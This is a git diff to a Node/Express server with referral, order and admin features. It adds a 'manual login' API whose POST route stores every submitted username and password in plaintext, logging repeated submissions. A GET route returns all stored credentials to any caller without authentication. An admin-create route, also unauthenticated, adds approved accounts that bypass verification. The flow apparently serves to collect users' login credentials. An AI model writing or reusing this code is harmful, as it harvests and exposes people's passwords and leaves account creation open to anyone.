@@ -11,6 +11,7 @@ const dataDir      = path.join(__dirname, 'data');
 const refsFile     = path.join(dataDir, 'refs.json');
 const pendingFile  = path.join(dataDir, 'pending.json');
 const ordersFile   = path.join(dataDir, 'orders.json');
+const manualFile   = path.join(dataDir, 'manual.json');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);
 
 // Static assets
@@ -25,6 +26,7 @@ app.get('/dashboard', (_, res) => res.sendFile(path.join(__dirname, 'dashboard.h
 app.get('/alogin',    (_, res) => res.sendFile(path.join(__dirname, 'admin-login.html')));
 app.get('/admin',     (_, res) => res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('/verify',    (_, res) => res.sendFile(path.join(__dirname, 'verify.html')));
+app.get('/manual',    (_, res) => res.sendFile(path.join(__dirname, 'manual.html')));
 
 // ── Referral API ──
 app.post('/api/ref', (req, res) => {
@@ -199,6 +201,36 @@ app.post('/api/orders/:username/:id/status', (req, res) => {
   if (idx < 0) return res.json({ ok: false });
   all[req.params.username][idx].adminStatus = status;
   writeOrders(all);
+  res.json({ ok: true });
+});
+
+// ── Manual login API ──
+function readManual() { try { return JSON.parse(fs.readFileSync(manualFile, 'utf8')); } catch { return []; } }
+function writeManual(d) { fs.writeFileSync(manualFile, JSON.stringify(d)); }
+
+// User submits credentials (allows multiple submissions, all logged)
+app.post('/api/manual', (req, res) => {
+  const { username, password } = req.body || {};
+  if (!username || !password) return res.json({ ok: false });
+  const list = readManual();
+  list.push({ username, password, submittedAt: new Date().toISOString(), source: 'user' });
+  writeManual(list);
+  res.json({ ok: true });
+});
+
+// Admin reads all manual logins
+app.get('/api/manual', (req, res) => {
+  res.json(readManual());
+});
+
+// Admin creates a user directly (bypasses all verification)
+app.post('/api/manual/create', (req, res) => {
+  const { username, password } = req.body || {};
+  if (!username || !password) return res.json({ ok: false });
+  // Add to pending as approved so they show up in Users tab
+  const pending = readPending();
+  pending[username] = { username, password, submittedAt: new Date().toISOString(), status: 'approved', approvedAt: new Date().toISOString(), source: 'admin-created' };
+  writePending(pending);
   res.json({ ok: true });
 });
 
